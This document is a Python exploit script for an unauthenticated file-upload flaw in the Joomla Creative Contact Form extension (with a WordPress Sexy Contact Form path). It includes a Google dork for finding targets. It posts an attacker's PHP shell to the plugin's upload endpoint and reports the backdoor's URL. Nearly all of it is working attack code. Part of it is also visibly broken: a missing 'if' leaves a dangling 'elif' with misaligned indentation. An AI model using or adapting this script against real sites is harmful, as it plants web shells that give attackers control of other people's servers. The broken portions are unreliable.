#
#               Joomla extension version: <= 2.0.0
# 
# Vulnerability discovered by Gianni Angelozzi
#
# Exploit written by Claudio Viviani
#
# Dork google joomla   :  inurl:com_creativecontactform
#
# Tested on BackBox 3.x
#
# http connection
import urllib, urllib2, sys, mimetypes
# Args management
import optparse
# file management
import os, os.path

# Check url
def checkurl(url):
    if url[:8] != "https://" and url[:7] != "http://":
        print(&#039;[X] You must insert http:// or https:// procotol&#039;)
        sys.exit(1)
    else:
        return url

# Check if file exists and has readable
def checkfile(file):
    if not os.path.isfile(file) and not os.access(file, os.R_OK):
        print &#039;[X] &#039;+file+&#039; file is missing or not readable&#039;
        sys.exit(1)
    else:
        return file
# Get file&#039;s mimetype
def get_content_type(filename):
    return mimetypes.guess_type(filename)[0] or &#039;application/octet-stream&#039;

# Create multipart header
def create_body_sh3ll_upl04d(payloadname):

   getfields = dict()

   payloadcontent = open(payloadname).read()

   LIMIT = &#039;----------lImIt_of_THE_fIle_eW_$&#039;
   CRLF = &#039;\r\n&#039;

   L = []
   for (key, value) in getfields.items():
      L.append(&#039;--&#039; + LIMIT)
      L.append(&#039;Content-Disposition: form-data; name="%s"&#039; % key)
      L.append(&#039;&#039;)
      L.append(value)

   L.append(&#039;--&#039; + LIMIT)
   L.append(&#039;Content-Disposition: form-data; name="%s"; filename="%s"&#039; % (&#039;files[]&#039;, payloadname))
   L.append(&#039;Content-Type: %s&#039; % get_content_type(payloadname))
   L.append(&#039;&#039;)
   L.append(payloadcontent)
   L.append(&#039;--&#039; + LIMIT + &#039;--&#039;)
   L.append(&#039;&#039;)
   body = CRLF.join(L)
   return body

banner = """


  ___ ___               __                            __,-,__                                  
 |   Y   .-----.----.--|  .-----.----.-----.-----.   |  &#039; &#039;__|                                 
 |.  |   |  _  |   _|  _  |  _  |   _|  -__|__ --|   |     __|                                 
 |. / \  |_____|__| |_____|   __|__| |_____|_____|   |_______|                                 
 |:      |    _______     |__|             __           |_|                                    
 |::.|:. |   |   _   .-----.-----.--------|  .---.-.                                           
 `--- ---&#039;   |___|   |  _  |  _  |        |  |  _  |                                           
             |.  |   |_____|_____|__|__|__|__|___._|                                           
             |:  1   |                                                                         
             |::.. . |                                                                         
             `-------&#039;      
  _______                  __   __                 _______             __              __
 |   _   .----.-----.---.-|  |_|__.--.--.-----.   |   _   .-----.-----|  |_.---.-.----|  |_    
 |.  1___|   _|  -__|  _  |   _|  |  |  |  -__|   |.  1___|  _  |     |   _|  _  |  __|   _|   
 |.  |___|__| |_____|___._|____|__|\___/|_____|   |.  |___|_____|__|__|____|___._|____|____|   
 |:  1   |       _______                          |:  1   |                                    
 |::.. . |      |   _   .-----.----.--------.     |::.. . |                                    
 `-------&#039;      |.  1___|  _  |   _|        |     `-------&#039;                                    
                |.  __) |_____|__| |__|__|__|                                                  
                |:  |                                                                          
                |::.|                                                                          
                `---&#039;                                                                          
                                                                                               

                                                     Cr3ative C0nt4ct Form Sh3ll Upl04d

                                     Discovered by:
                                     
                                    Gianni Angelozzi

                                      Written by:

                                    Claudio Viviani

                                 http://www.homelab.it

                                    info@homelab.it
                                homelabit@protonmail.ch

                            https://www.facebook.com/homelabit
                              https://twitter.com/homelabit
                            https://plus.google.com/+HomelabIt1/
                   https://www.youtube.com/channel/UCqqmSdMqf_exicCe_DjlBww
"""

commandList = optparse.OptionParser(&#039;usage: %prog -t URL -c CMS-f FILENAME.PHP [--timeout sec]&#039;)
commandList.add_option(&#039;-t&#039;, &#039;--target&#039;, action="store",
                  help="Insert TARGET URL: http[s]://www.victim.com[:PORT]",
                  )
commandList.add_option(&#039;-c&#039;, &#039;--cms&#039;, action="store",
                  )
commandList.add_option(&#039;-f&#039;, &#039;--file&#039;, action="store",
                  help="Insert file name, ex: shell.php",
                  )
commandList.add_option(&#039;--timeout&#039;, action="store", default=10, type="int",
                  help="[Timeout Value] - Default 10",
                  )

options, remainder = commandList.parse_args()

# Check args
if not options.target or not options.file or not options.cms:
    print(banner)
    commandList.print_help()
    sys.exit(1)

payloadname = checkfile(options.file)
host = checkurl(options.target)
timeout = options.timeout
cmstype = options.cms

print(banner)

   url_sexy_upload = host+&#039;/wp-content/plugins/sexy-contact-form/includes/fileupload/index.php&#039;
   backdoor_location = host+&#039;/wp-content/plugins/sexy-contact-form/includes/fileupload/files/&#039;

elif options.cms == "joomla":
   url_sexy_upload = host+&#039;/components/com_creativecontactform/fileupload/index.php&#039;
   backdoor_location = host+&#039;/components/com_creativecontactform/fileupload/files/&#039;

else:
   sys.exit(1)

content_type = &#039;multipart/form-data; boundary=----------lImIt_of_THE_fIle_eW_$&#039;

bodyupload = create_body_sh3ll_upl04d(payloadname)

headers = {&#039;User-Agent&#039;: &#039;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36&#039;,
           &#039;content-type&#039;: content_type,
           &#039;content-length&#039;: str(len(bodyupload)) }

try:
   req = urllib2.Request(url_sexy_upload, bodyupload, headers)
   response = urllib2.urlopen(req)

   if "error" in response.read():
      print("[X] Upload Failed :(")
   else:
      print("[!] Shell Uploaded")
      print("[!] "+backdoor_location+options.file)
except urllib2.HTTPError as e:
   print("[X] Http Error: "+str(e.code))
except urllib2.URLError as e:
   print("[X] Connection Error: "+str(e.code))

